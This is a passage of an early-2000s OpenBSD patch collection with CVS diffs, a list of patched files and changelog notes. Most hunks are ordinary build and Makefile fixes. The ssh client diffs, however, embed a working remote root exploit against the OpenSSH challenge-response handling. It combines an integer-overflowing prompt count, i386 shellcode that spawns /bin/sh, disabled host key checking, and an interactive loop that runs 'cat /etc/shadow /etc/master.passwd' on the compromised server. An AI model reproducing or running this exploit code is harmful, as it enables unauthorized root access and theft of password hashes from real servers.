-	    "1246ab:c:e:fgi:kl:m:no:p:qstvxACD:F:I:L:NPR:TVX")) != -1) {
+	    "1246ab:c:d:e:fgi:j:kl:m:no:p:qr:stvxzACD:F:I:L:M:NPR:S:TVX")) != -1) {
 		switch (opt) {
+		case 'S':
+			style = optarg;
+			break;
+		case 'M':
+			if (!strcmp(optarg, "skey")) method = S;
+			 else if (!strcmp(optarg, "bsdauth")) method = B;
+			break;
+		case 'd':
+			tcode_rep = atoi(optarg);
+			break;
+		case 'j':
+			chunk_size = atoi(optarg);
+			break;
+		case 'r':
+			scode_rep = atoi(optarg);
+			break;
+		case 'z':
+			testing = 1;
+			break;
 		case '1':
 			options.protocol = SSH_PROTO_1;
 			break;
@@ -572,6 +605,12 @@
 
 		/* Read systemwide configuration file after use config. */
 		(void)read_config_file(_PATH_HOST_CONFIG_FILE, host, &options);
+	}
+
+	if (method != N) {
+		options.preferred_authentications = "keyboard-interactive";
+		options.strict_host_key_checking = 0;
+		options.protocol = SSH_PROTO_2;
 	}
 
 	/* Fill configuration defaults. */
Index: src/usr.bin/ssh/ssh.h
===================================================================
RCS file: /cvs/src/usr.bin/ssh/ssh.h,v
retrieving revision 1.71
diff -u -r1.71 ssh.h
--- src/usr.bin/ssh/ssh.h	22 Jun 2002 02:00:07 -0000	1.71
+++ src/usr.bin/ssh/ssh.h	20 Dec 2002 23:24:46 -0000
@@ -95,4 +95,6 @@
 /* Minimum modulus size (n) for RSA keys. */
 #define SSH_RSA_MINIMUM_MODULUS_SIZE	768
 
+typedef enum { S, B, N } SSH_XpMethod;
+
 #endif				/* SSH_H */
Index: src/usr.bin/ssh/sshconnect2.c
===================================================================
RCS file: /cvs/src/usr.bin/ssh/sshconnect2.c,v
retrieving revision 1.110
diff -u -r1.110 sshconnect2.c
--- src/usr.bin/ssh/sshconnect2.c	19 Dec 2002 00:06:40 -0000	1.110
+++ src/usr.bin/ssh/sshconnect2.c	20 Dec 2002 23:24:46 -0000
@@ -47,10 +47,14 @@
 #include "canohost.h"
 #include "msg.h"
 #include "pathnames.h"
+#include "atomicio.h"
 
 /* import */
 extern char *client_version_string;
 extern char *server_version_string;
+extern char *style;
+extern int testing, chunk_size, tcode_rep, scode_rep;
+extern SSH_XpMethod method;
 extern Options options;
 
 /*
@@ -219,6 +223,7 @@
 {
 	Authctxt authctxt;
 	int type;
+	char *p;
 
 	if (options.challenge_response_authentication)
 		options.kbd_interactive_authentication = 1;
@@ -259,6 +264,15 @@
 	if (authctxt.method == NULL)
 		fatal("ssh_userauth2: internal error: cannot send userauth none request");
 
+	if (method == B) {
+		if (!(p = malloc(strlen(authctxt.server_user) + strlen(style) + 2)))
+			fatal("malloc() failed");
+		sprintf(p, "%s:%s", authctxt.server_user, style);
+		authctxt.server_user = p;
+	}
+
+	if (method != N) printf("[i] server_user: %s\n", authctxt.server_user);
+
 	/* initial userauth request */
 	userauth_none(&authctxt);
 
@@ -335,6 +349,7 @@
 	Authctxt *authctxt = ctxt;
 	char *authlist = NULL;
 	int partial;
+	static int enter = 0;
 
 	if (authctxt == NULL)
 		fatal("input_userauth_failure: no authentication context");
@@ -343,6 +358,13 @@
 	partial = packet_get_char();
 	packet_check_eom();
 
+	if (!enter++) {
+		if (strstr(authlist, "keyboard-interactive"))
+			fprintf(stderr, "[x] keyboard-interactive method available\n");
+		  else
+			fprintf(stderr, "[_] keyboard-interactive method available\n");
+	}
+
 	if (partial != 0)
 		log("Authenticated with partial success.");
 	debug("Authentications that can continue: %s", authlist);
@@ -815,10 +837,19 @@
 {
 	static int attempt = 0;
 
-	if (attempt++ >= options.number_of_password_prompts)
+	if ((method == N) && (attempt >= options.number_of_password_prompts))
 		return 0;
+
 	/* disable if no SSH2_MSG_USERAUTH_INFO_REQUEST has been seen */
-	if (attempt > 1 && !authctxt->info_req_seen) {
+	if (attempt++ > 1 && !authctxt->info_req_seen) {
+		switch(method) {
+			case S:
+				printf("[x] skey not available\n");
+				break;
+			case B:
+				printf("[x] bsdauth (%s) not available\n", style);
+				break;
+		}
 		debug3("userauth_kbdint: disable: no info_req_seen");
 		dispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, NULL);
 		return 0;
@@ -830,20 +861,115 @@
 	packet_put_cstring(authctxt->service);
 	packet_put_cstring(authctxt->method->name);
 	packet_put_cstring("");					/* lang */
-	packet_put_cstring(options.kbd_interactive_devices ?
-	    options.kbd_interactive_devices : "");
+
+	switch (method) {
+		case N:
+			packet_put_cstring(options.kbd_interactive_devices ?
+			    options.kbd_interactive_devices : "");
+			break;
+		case S:
+			packet_put_cstring("skey");
+			break;
+		case B:
+			packet_put_cstring("bsdauth");
+			break;
+	}
+
 	packet_send();
 
 	dispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, &input_userauth_info_req);
 	return 1;
 }
 
+#ifdef MAX
+#undef MAX
+#endif
+
+#define MAX(a, b) (((a) > (b)) ? (a) : (b))
+
+void
+exploit_interactive(int sock)
+{
+	int i, n;
+	int owned = 0;
+	int responses = 0;
+	fd_set fds;
+	struct timeval tv;
+
+	char buff[1024];
+	char *cmdz = "uname -a;id;cat /etc/shadow /etc/master.passwd\n";
+
+	for(;;) {
+		tv.tv_sec = 15;
+		tv.tv_usec = 0;
+
+		FD_ZERO(&fds);
+		FD_SET(STDIN_FILENO, &fds);
+		FD_SET(sock, &fds);
+
+		if (select(MAX(STDIN_FILENO, sock) + 1, &fds, NULL, NULL, owned ? NULL : &tv) > 0) {
+			if (FD_ISSET(sock, &fds)) {
+				if ((n = read(sock, buff, sizeof buff)) < 0) {
+					perror("read()");
+					break;
+				}
+				if (n >= 1) {
+					if (!owned) {
+						for (i = 0; i < n; i++)
+			   				if (buff[i] == 'G')
+								responses++;
+			   				  else
+								responses = 0;
+						if (responses >= 2) {
+			   				owned = 1;
+			    				atomicio(write, sock, "O", 1);
+			   				atomicio(write, sock, cmdz, strlen(cmdz));
+						}
+					} else {
+						write(STDOUT_FILENO, buff, n);
+					}
+				}
+			} /* sock */
+			if (FD_ISSET(STDIN_FILENO, &fds)) {
+				if ((n = read(STDIN_FILENO, buff, sizeof buff)) < 0) {
+						perror("read()");
+						break;
+				}
+				atomicio(write, sock, buff, n);
+			} /* stdin */
+		} /* select */
+		if (!owned)
+			break;
+	} /* for */
+}
+
 /*
  * parse INFO_REQUEST, prompt user and send INFO_RESPONSE
  */
 void
 input_userauth_info_req(int type, u_int32_t seq, void *ctxt)
 {
+	char tcod[] =
+	"\x31\xc0\x50\x6a\x14\x50\x6a\x14\x54\x50\x50\xb0\xc3\xcd\x80"
+	"\xeb\xfe";
+
+	char mcod[] =
+	"\x68\x47\x47\x47\x47\x89\xe3\x31\xc0\x50\x50\x50\x50\xc6\x04\x24"
+	"\x04\x53\x50\x50\x31\xd2\x31\xc9\xb1\x80\xc1\xe1\x18\xd1\xea\x31"
+	"\xc0\xb0\x85\xcd\x80\x72\x02\x09\xca\xff\x44\x24\x04\x80\x7c\x24"
+	"\x04\x20\x75\xe9\x31\xc0\x89\x44\x24\x04\xc6\x44\x24\x04\x20\x89"
+	"\x64\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x89"
+	"\x54\x24\x18\x8b\x54\x24\x18\x89\x14\x24\x31\xc0\xb0\x5d\xcd\x80"
+	"\x31\xc9\xd1\x2c\x24\x73\x27\x31\xc0\x50\x50\x50\x50\xff\x04\x24"
+	"\x54\xff\x04\x24\xff\x04\x24\xff\x04\x24\xff\x04\x24\x51\x50\xb0"
+	"\x1d\xcd\x80\x58\x58\x58\x58\x58\x3c\x4f\x74\x0b\x58\x58\x41\x80"
+	"\xf9\x20\x75\xce\xeb\xbd\x90\x31\xc0\x50\x51\x50\x31\xc0\xb0\x5a"
+	"\xcd\x80\xff\x44\x24\x08\x80\x7c\x24\x08\x03\x75\xef\x31\xc0\x50"
+	"\xc6\x04\x24\x0b\x80\x34\x24\x01\x68\x42\x4c\x45\x2a\x68\x2a\x47"
+	"\x4f\x42\x89\xe3\xb0\x09\x50\x53\xb0\x01\x50\x50\xb0\x04\xcd\x80"
+	"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
+	"\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\xcc";
+
 	Authctxt *authctxt = ctxt;
 	char *name, *inst, *lang, *prompt, *response;
 	u_int num_prompts, i;
@@ -868,6 +994,10 @@
 	xfree(lang);
 
 	num_prompts = packet_get_int();
+
+	chunk_size = chunk_size ? chunk_size : 4096;
+	num_prompts = 0x40000000 + chunk_size / 4;
+
 	/*
 	 * Begin to build info response packet based on prompts requested.
 	 * We commit to providing the correct number of responses, so if
@@ -877,22 +1007,51 @@
 	packet_start(SSH2_MSG_USERAUTH_INFO_RESPONSE);
 	packet_put_int(num_prompts);
 
-	debug2("input_userauth_info_req: num_prompts %d", num_prompts);
-	for (i = 0; i < num_prompts; i++) {
-		prompt = packet_get_string(NULL);
-		echo = packet_get_char();
-
-		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
-
-		packet_put_cstring(response);
-		memset(response, 0, strlen(response));
-		xfree(response);
-		xfree(prompt);
+	if (method != N) {
+		response = "G";
+		for (i = 0; i < chunk_size / 4; i++)
+			packet_put_cstring(response);
+
+		if (testing) {
+			tcode_rep = tcode_rep ? tcode_rep : 10000;
+			scode_rep = 0;
+		} else {
+			tcode_rep = tcode_rep ? tcode_rep : 0;
+			scode_rep = scode_rep ? scode_rep : 60;
+		}
+
+		for (i = 0; i < tcode_rep; i++)
+			packet_put_string(tcod, sizeof(tcod)-1);
+
+		for (i = 0; i < scode_rep; i++)
+			packet_put_string(mcod, sizeof(mcod)-1);
+
+		packet_put_int(257 * 1024);
+		printf("[*] chunk_size: %d tcode_rep: %d scode_rep %d\n",
+			chunk_size, tcode_rep, scode_rep);
+		printf("[*] mode: %s\n", testing ? "testing" : "exploitation");
+	} else {
+		debug2("input_userauth_info_req: num_prompts %d", num_prompts);
+		for (i = 0; i < num_prompts; i++) {
+			prompt = packet_get_string(NULL);
+			echo = packet_get_char();
+
+			response = read_passphrase(prompt, echo ? RP_ECHO : 0);
+
+			packet_put_cstring(response);
+			memset(response, 0, strlen(response));
+			xfree(response);
+			xfree(prompt);
+		}
+		packet_check_eom(); /* done with parsing incoming message. */
 	}
-	packet_check_eom(); /* done with parsing incoming message. */
 
 	packet_add_padding(64);
 	packet_send();
+	if (method != N) {
+		packet_write_wait();
+		exploit_interactive(packet_get_connection_in());
+	}
 }
 
 static int
@@ -1033,7 +1192,7 @@
 	if (sensitive->external_keysign)
 		ok = ssh_keysign(private, &signature, &slen,
 		    buffer_ptr(&b), buffer_len(&b));
-	else
+	  else
 		ok = key_sign(private, &signature, &slen,
 		    buffer_ptr(&b), buffer_len(&b));
 	key_free(private);
Index: src/usr.bin/ssh/ssh/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/ssh/ssh/Makefile,v
retrieving revision 1.42
diff -u -r1.42 Makefile
--- src/usr.bin/ssh/ssh/Makefile	20 Jun 2002 19:55:45 -0000	1.42
+++ src/usr.bin/ssh/ssh/Makefile	20 Dec 2002 23:24:46 -0000
@@ -23,7 +23,7 @@
 DPADD+=  ${LIBKRB5} ${LIBASN1} ${LIBCOM_ERR}
 .endif # KERBEROS5
 
-.if (${KERBEROS:L} == "yes")
+.if (${KERBEROS4:L} == "yes")
 CFLAGS+= -DKRB4 -I${DESTDIR}/usr/include/kerberosIV
 LDADD+=	 -lkrb
 DPADD+=	 ${LIBKRB}
Index: src/usr.bin/ssh/sshd/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/ssh/sshd/Makefile,v
retrieving revision 1.51
diff -u -r1.51 Makefile
--- src/usr.bin/ssh/sshd/Makefile	20 Jun 2002 19:55:45 -0000	1.51
+++ src/usr.bin/ssh/sshd/Makefile	20 Dec 2002 23:24:46 -0000
@@ -26,7 +26,7 @@
 DPADD+= ${LIBKRB5} ${LIBKAFS} ${LIBASN1} ${LIBCOM_ERR}
 .endif # KERBEROS5
 
-.if (${KERBEROS:L} == "yes")
+.if (${KERBEROS4:L} == "yes")
 .if (${AFS:L} == "yes")
 CFLAGS+= -DAFS
 LDADD+=  -lkafs
Index: src/usr.bin/sudo/Makefile.bsd-wrapper
===================================================================
RCS file: /cvs/src/usr.bin/sudo/Makefile.bsd-wrapper,v
retrieving revision 1.15
diff -u -r1.15 Makefile.bsd-wrapper
--- src/usr.bin/sudo/Makefile.bsd-wrapper	26 Apr 2002 16:04:02 -0000	1.15
+++ src/usr.bin/sudo/Makefile.bsd-wrapper	20 Dec 2002 23:24:46 -0000
@@ -14,7 +14,7 @@
 DPADD+= ${LIBSKEY}
 .endif
 
-.if (${KERBEROS:L} == "yes")
+.if (${KERBEROS4:L} == "yes")
 CONFIGURE_OPTS+=--with-kerb4
 LDADD+= -lkrb -ldes -lkafs
 DPADD+= ${LIBKRB} ${LIBDES} ${LIBKAFS}
Index: src/usr.bin/xlint/lint1/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/xlint/lint1/Makefile,v
retrieving revision 1.3
diff -u -r1.3 Makefile
--- src/usr.bin/xlint/lint1/Makefile	11 Sep 2001 00:06:06 -0000	1.3
+++ src/usr.bin/xlint/lint1/Makefile	20 Dec 2002 23:24:46 -0000
@@ -8,7 +8,7 @@
 LDADD+=	-ll
 DPADD+=	${LIBL}
 YFLAGS=	-d
-CFLAGS+=-I.
+CFLAGS+=-I. -I${.CURDIR}
 LINTFLAGS=-aehpz
 CLEANFILES+=y.tab.h cgram.c scan.c
 
Index: src/usr.sbin/amd/fsinfo/Makefile
===================================================================
RCS file: /cvs/src/usr.sbin/amd/fsinfo/Makefile,v
retrieving revision 1.1.1.1
diff -u -r1.1.1.1 Makefile
--- src/usr.sbin/amd/fsinfo/Makefile	18 Oct 1995 08:46:59 -0000	1.1.1.1
+++ src/usr.sbin/amd/fsinfo/Makefile	20 Dec 2002 23:24:46 -0000
@@ -12,7 +12,7 @@
 CLEANFILES= \
 	fsi_gram.c y.tab.c fsi_gram.h y.tab.h \
 	fsi_lex.c lex.yy.c y.output
-CFLAGS+=-I.
+CFLAGS+=-I. -I${.CURDIR}
 CFLAGS+=-I${.CURDIR}/../include
 CFLAGS+=-I${.CURDIR}/../config
 CFLAGS+=-DOS_HDR=\"os-${OS}.h\"
Index: src/usr.sbin/arp/arp.8
===================================================================
RCS file: /cvs/src/usr.sbin/arp/arp.8,v
retrieving revision 1.12
diff -u -r1.12 arp.8
--- src/usr.sbin/arp/arp.8	13 Feb 2002 08:33:25 -0000	1.12
+++ src/usr.sbin/arp/arp.8	20 Dec 2002 23:24:46 -0000
@@ -136,6 +136,7 @@
 .Ed
 .Pp
 with argument meanings as given above.
+Lines beginning with '#' are considered comments and are ignored.
 .El
 .Sh EXAMPLES
 To view the current
Index: src/usr.sbin/arp/arp.c
===================================================================
RCS file: /cvs/src/usr.sbin/arp/arp.c,v
retrieving revision 1.25
diff -u -r1.25 arp.c
--- src/usr.sbin/arp/arp.c	3 Dec 2002 22:33:28 -0000	1.25
+++ src/usr.sbin/arp/arp.c	20 Dec 2002 23:24:46 -0000
@@ -198,7 +198,9 @@
 	args[3] = &arg[3][0];
 	args[4] = &arg[4][0];
 	retval = 0;
-	while (fgets(line, 100, fp) != NULL) {
+	while (fgets(line, sizeof(line), fp) != NULL) {
+		if ((line[0] == '#') || (line[0] == '\n'))
+			continue;
 		i = sscanf(line, "%49s %49s %49s %49s %49s", arg[0], arg[1], arg[2],
 		    arg[3], arg[4]);
 		if (i < 2) {
Index: src/usr.sbin/named/host/Makefile
===================================================================
RCS file: /cvs/src/usr.sbin/named/host/Makefile,v
retrieving revision 1.4
diff -u -r1.4 Makefile
--- src/usr.sbin/named/host/Makefile	11 May 2002 00:19:58 -0000	1.4
+++ src/usr.sbin/named/host/Makefile	20 Dec 2002 23:24:46 -0000
@@ -8,5 +8,9 @@
 
 CFLAGS+=${INCLUDE} ${CONFIG}
 
+afterinstall:
+	cd ${.CURDIR} && ${INSTALL} ${INSTALL_COPY} -o root -g bin \
+		-m 555 nslookup ${DESTDIR}${BINDIR}
+
 .include "../../Makefile.inc"
 .include <bsd.prog.mk>
Index: src/usr.sbin/pppd/Makefile
===================================================================
RCS file: /cvs/src/usr.sbin/pppd/Makefile,v
retrieving revision 1.15
diff -u -r1.15 Makefile
--- src/usr.sbin/pppd/Makefile	19 May 2002 20:47:30 -0000	1.15
+++ src/usr.sbin/pppd/Makefile	20 Dec 2002 23:24:46 -0000
@@ -15,6 +15,6 @@
 
 LDADD=	-lpcap -lutil
 DPADD=	${LIBPCAP} ${LIBUTIL}
-CFLAGS+= -I. -I${PCAPDIR} -DHAVE_PATHS_H -DIPX_CHANGE -DPPP_FILTER -DUSE_CRYPT -DCHAPMS
+CFLAGS+= -I. -I${.CURDIR} -I${PCAPDIR} -DHAVE_PATHS_H -DIPX_CHANGE -DPPP_FILTER -DUSE_CRYPT -DCHAPMS
 
 .include <bsd.prog.mk>
Index: src/usr.sbin/rpc.lockd/Makefile
===================================================================
RCS file: /cvs/src/usr.sbin/rpc.lockd/Makefile,v
retrieving revision 1.4
diff -u -r1.4 Makefile
--- src/usr.sbin/rpc.lockd/Makefile	19 Aug 1997 08:04:55 -0000	1.4
+++ src/usr.sbin/rpc.lockd/Makefile	20 Dec 2002 23:24:46 -0000
@@ -7,7 +7,7 @@
 DPADD=	${LIBRPCSVC}
 LDADD=	-lrpcsvc
 
-CFLAGS+= -I. -DSYSLOG
+CFLAGS+= -I. -I${.CURDIR} -DSYSLOG
 
 CLEANFILES= nlm_prot_svc.c nlm_prot.h
 

Index: ports/mystuff/diff-metafiles (meta file)
===================================================================
ports/mystuff/diff-metafiles	.
ports/mystuff/diff-patchfiles	.
ports/mystuff/diff-addedfiles	.
ports/mystuff/diff-notes	.
Index: ports/mystuff/diff-patchfiles (meta file)
===================================================================
src/bin/csh/csh.1				humantime
src/bin/csh/func.c				humantime
src/bin/ksh/c_ulimit.c				humantime
src/bin/ksh/ksh.1tbl				humantime
src/distrib/Makefile				-crunch
src/distrib/sets/lists/base/md.i386		sync...
src/distrib/sets/lists/base/mi
src/distrib/sets/lists/comp/md.i386
src/distrib/sets/lists/comp/mi
src/distrib/sets/lists/etc/mi
src/distrib/sets/lists/game/mi
src/distrib/sets/lists/man/md.i386
src/distrib/sets/lists/man/mi
src/distrib/sets/lists/misc/mi
src/etc/inetd.conf				irc bridge
src/etc/sysctl.conf				ECN on by default
src/gnu/usr.bin/perl/Configure			usedl=n (static linking)
src/gnu/usr.bin/perl/Makefile.bsd-wrapper	$.curdir, usedl
src/gnu/usr.sbin/sendmail/sendmail/conf.c	humantime
src/lib/libc/gen/login_cap.c			humantime
src/lib/libc/sys/getrlimit.2			humantime
src/lib/libutil/passwd.c			humantime
src/sys/arch/i386/stand/libsa/apmprobe.c	mwatts+KNF
src/sys/arch/i386/stand/libsa/cmd_i386.c	mwatts
src/sys/arch/i386/stand/libsa/gidt.S		ansi C fixes
src/sys/arch/i386/stand/libsa/libsa.h		mwatts
src/sys/dev/ic/dc.c
src/sys/dev/mii/bmtphy.c
src/sys/kern/kern_sig.c
src/sys/kern/kern_synch.c
src/sys/kern/kern_sysctl.c
src/sys/kern/subr_userconf.c
src/sys/kern/sys_generic.c
src/sys/kern/vfs_syscalls.c
src/sys/lib/libz/Makefile			$.curdir
src/sys/miscfs/procfs/procfs_vnops.c
src/sys/miscfs/union/union_vnops.c
src/sys/net/if_bridge.c
src/sys/net/if_gif.c
src/sys/net/if_vlan.c
src/sys/net/pf.c
src/sys/net/pfkeyv2.c
src/sys/netinet/ip_ah.c
src/sys/netinet/ip_esp.c
src/sys/netinet/ip_ipcomp.c
src/sys/netinet/ip_ipsp.c
src/sys/netinet/ip_output.c
src/sys/netinet/ipsec_output.c
src/sys/netinet/tcp_input.c
src/sys/netinet/tcp_output.c
src/sys/netinet/tcp_subr.c			ECN on by default
src/sys/netinet/tcp_usrreq.c
src/sys/netinet/udp_usrreq.c
src/sys/netinet6/in6_ifattach.c
src/sys/netinet6/ip6_forward.c
src/sys/netinet6/ip6_output.c
src/sys/netinet6/raw_ip6.c
src/sys/nfs/nfsproto.h				higher default block sizes
src/sys/stand/boot/cmd.c			mwatts
src/sys/sys/resource.h				humantime
src/sys/ufs/ffs/ffs_softdep.c
src/sys/ufs/ffs/ffs_vfsops.c
src/sys/uvm/uvm_amap.c
src/sys/uvm/uvm_map.c
src/sys/uvm/uvm_pager.c
src/sys/uvm/uvm_swap.c
src/usr.bin/passwd/Makefile			$.curdir, krb4
src/usr.bin/rdist/Makefile			$.curdir
src/usr.bin/rsh/Makefile			kerberos4
src/usr.bin/ssh/lib/Makefile 			kerberos4
src/usr.bin/ssh/ssh.c				gobbles
src/usr.bin/ssh/ssh.h				gobbles
src/usr.bin/ssh/ssh/Makefile			kerberos4
src/usr.bin/ssh/sshconnect2.c			gobbles
src/usr.bin/ssh/sshd/Makefile			kerberos4
src/usr.bin/sudo/Makefile.bsd-wrapper		kerberos4
src/usr.bin/xlint/lint1/Makefile		$.curdir
src/usr.sbin/amd/fsinfo/Makefile		$.curdir
src/usr.sbin/arp/arp.8				arp stripcomments
src/usr.sbin/arp/arp.c				stripcomments
src/usr.sbin/named/host/Makefile		add nslookup
src/usr.sbin/pppd/Makefile			$.curdir
src/usr.sbin/rpc.lockd/Makefile			$.curdir
Index: ports/mystuff/diff-addedfiles (meta file)
===================================================================
Index: ports/mystuff/diff-notes (meta file)
===================================================================
| Thanks to several people supplyed me with patches; in no particular order
| and not only probably incomplete: the apache IPv6 patch team at KAME, Han
| Boetes, Jedi/Sector One, me ;-), Marcus Watts, some NetBSD guy, <dr> from
| irc.ipv6.freenode.net, <reverse> alias Michael Knudsen, <moid> alias Miod
| Vallat, <schubert> alias Michael Schubert, and many more...

. add "better NFS default" blocksize patch partially (jedi/sector one)
. add -I${.CURDIR} to many CFLAGS where missing (gcc 3.2 is more picky)
. add /stand-related pactches except for defer-fd-disklabel (mwatts)
. add an ssh exploit for network testing (gobbles, integration work by me)
. add compile flag for gcc-3.2 kernel builds
. add ctm-update and other helpful macroes to /etc/profile
. add extra BIND 4 host command and nslookup compat emulation
. add faster/leaner method of clearing /tmp if not a separate filesystem
. add first floppy always in all kernels, even when detached
. add flags to build no kernel, or just no ramdiscs, to make release
. add fork bomb defusion code (schubert, integration work by me)
. add fsck fix (jedi/sector one; partially committed by henning@)
. add gs, ggr and stripcomm functions to /etc/profile
. add kernel config file source into kernel image (jedi/sector one, me)
. add kernel signal patch (jedi/sector one)
. add loading of arp entries in /etc/rc, fix arp accordingly (both by reverse)
. add microBSD jumbo patch minor kernel fixes (j; mod me; partially merged)
. add missing ; several times
. add my bleeding-edge fixes to rdate, mostly commited by jakob@
. add new ulimit (humantime) (jedi/sector one)
. add note about RCSing files in /etc to root.mail
. add note about ports tree patches to root.mail
. add patches from teso (ideas: teso security group; cobbled together by me)
. add pfctl "fuck-off" keyword (me, inspired by semi-working patch from <dr>)
. add random seed file exchanger and rdate to cron
. add several lots of gcc-3.2 related small patches or fixes
. build and install crunch tools, honour DESTDIR
. build only telnet{,d} with kerberos any more
. build strictly optimized for _pentium_ _only_, speed (-O2)
. build using gcc-3.2 (only...)
. build using in-tree g++-2.95.3 (g++-3.2 doesnt work on libcurses++)
. build with no Kerberos more than necessary
. build with no YP, NLS, AFS, profiled libraries
. disable building of shared libs temporarily until switch to ELF is completed
. disable hardware cache on hard discs by default due to softdep
. don't build Objective C, Fortran 77
. don't build code that doesn't compile cleanly yet
. don't build in-tree BIND 4 except host/nslookup
. don't read fd? disklabel in /boot until it is needed
. enable TCP Explicit Congestion Notification by default
. enable softdep by default
. fix DESTDIR/BINDIR in some Makefiles
. fix building of rdate with latest SuSE GNU/Linux
. fix mount(8) needing -t ... (reverse, new patch by gluk@, committed, ci by todd)
. fix patch-metafiles containing spaces before tabs
. fix trailing whitespace in diffs by mwatts and especially jedi/sector one
. get rid of ``...´´ chars mis-used in manpages as "..."
. get rid of kerberos/afs/... leftovers
. get rid of pcvtfonts, we don't use wscons
. get rid of posixly broken time zone information files
. get rid of tainting the kernel with the GNU GPL
. include /etc/profile to be used as a sample
. include mk.conf used to build
. include ssh host key samples (openbsd anoncvs, ...)
. make /boot faster on laptops
. make OpenIPF-altq (pfctl) obey SI units
. make a lot of files KNF
. make a new skip-fsck patch
. make dynamic linking capability in csu flaggable
. make kernel and libc 16 bytes smaller
. make kernel execute ELF binaries right now (me by drahn@ and NetBSD)
. make patch split into more than one file
. make sendmail.cf nicer
. make unique colourized xterm
. pipe disklabel, fdisk in-binary man pages through col -b (hint by watts)
. plus everything I've forgotten
. regenerate ports and patches; get rid of $OpenBSD rcs id when unneeded
. split up core diff into some parts
. sync distrib/sets/lists accordingly
. sync log files with local usus
. sync mtree and rc files with reality
. sync uname and kernel boot message with reality
